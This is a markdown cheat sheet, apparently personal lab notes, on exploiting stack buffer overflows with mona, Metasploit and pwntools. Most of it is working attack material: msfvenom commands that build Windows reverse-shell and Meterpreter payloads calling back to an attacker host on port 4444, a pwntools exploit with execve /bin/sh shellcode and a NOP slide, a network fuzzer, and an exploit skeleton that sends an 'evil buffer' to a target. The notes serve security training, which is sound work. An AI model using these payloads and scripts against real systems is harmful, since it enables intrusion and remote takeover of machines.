# Buffer Overflow

 Write more than the capacity of the memory
- Generating cyclic patterns
  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

- [Buffer overflow Cheat Sheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)


## Methods

1. Connect to target: **nc 10.10.9.228 1337**
2. Define local folder for mona: **!mona config -set workingfolder c:\Users\admin\Desktop\patota**
3. Send characters to find offsed: **python3 fuzzer.py**
  - /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l ###
   - exploit

4. Find offset: !mona findmsp -distance DISTANCE == Find Offset EIP
4. Fider ofsset 2: /usr/bin/msf-pattern_offset -l DISTANCE -q EIP Register

5. Set new return after offset: **retn = BBBB**
6. Set list o chars excluding badhchar: **!mona bytearray -b "\x00"**

7. Find next bad chars: **!mona compare -f C:\Users\admin\Desktop\patota\bytearray.bin -a ESP**

8. Find ESP address after eliminating bad chars: **!mona jmp -r esp -cpb "\x00\x01"**

9. New return address is the **jmp** found.
retn = jmp

10. Generate reverse shells:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 EXITFUNC=thread -b "BAD_CHARS" -f c

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -f rb -b "BAD_CHARS" -f c

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "BAD_CHARS" -f py -v shellcode

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f python --var-name shellcode EXITFUNC=thread 

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -b "\x00" -f c

msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
```

## GDB

```
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0xdeadbeef)

payload = padding + eip

print(payload)
```

- Method 1
  - Generate payload with metasploit
  - identify the value in the register (gdb i r)
  - compare patter offset
    - /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l # -q memory

- Method 2
  - Override EIP
  - Total to Override - EIP-Space
- Debugger - Reverse Engineering
  - gdb debugger
    - set exec-wrapper env -u LINES -u COLUMNS
    - run
      - Input - Buffer = Overflow
    - Find addresses:
      - disassemble [Funcion_Name]
      - print& function_Name = shows first address
    - Examine the dump hex code
      - x/100x $rsp-200
    - Show all registers
      - i r
  - [r2](https://github.com/radareorg/radare2)

- NOP instruction
  - no operation instruction = does nothing = \x90
  - python -c "print 'NOP'*no_of_nops + 'shellcode' + 'random_data'*no_of_random_data + 'memory address'"

## PWN Tools

- Debug exploit
- Commands
  - Stack canaries: detection of stack overflow
  - NX: non-executable, set memory segment to be writable or executable
  - PIR: Position Independent Executable: program dependencies into rando location

- Control EIP/RIP (instruction pointer) to execute overflow
  
- Cyclic
  - create customized overflows
  - padding = space until return address (EIP)

- Networking
  - Generate payload to overwrite eip
  
- Shellcraft
  - shell payload craft
  - find EIP with cyclic
  - find ESP ==> + 200 offset
  - How to point EIP to shellcode?
    - NOP = space holder = pass te eip to the next space
    - big lading pad of NPS + direct EIP to middle of stack = we land in our NOP + NOP will pass the eip to our code
  - payload: shellcraft
    - -f a = asci
    - -f s = string
    - shellcraf i386.linux.sh
    - shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f 

```
from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000

# shellcraft i386.linux.sh

# shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a

shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()
```

## Script Fuzzer
```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.9.228"

port = 1337
timeout = 5
prefix = "OVERFLOW10 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## Script Strings
```
#listRem = "\\x11".split("\\x")
#

for x in range(1, 256):
  #if "{:02x}".format(x) not in listRem:
    print("\\x" + "{:02x}".format(x), end='')
print()

```

## Exploit
```
import socket

ip = "10.10.9.228"
port = 1337

prefix = "OVERFLOW10 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```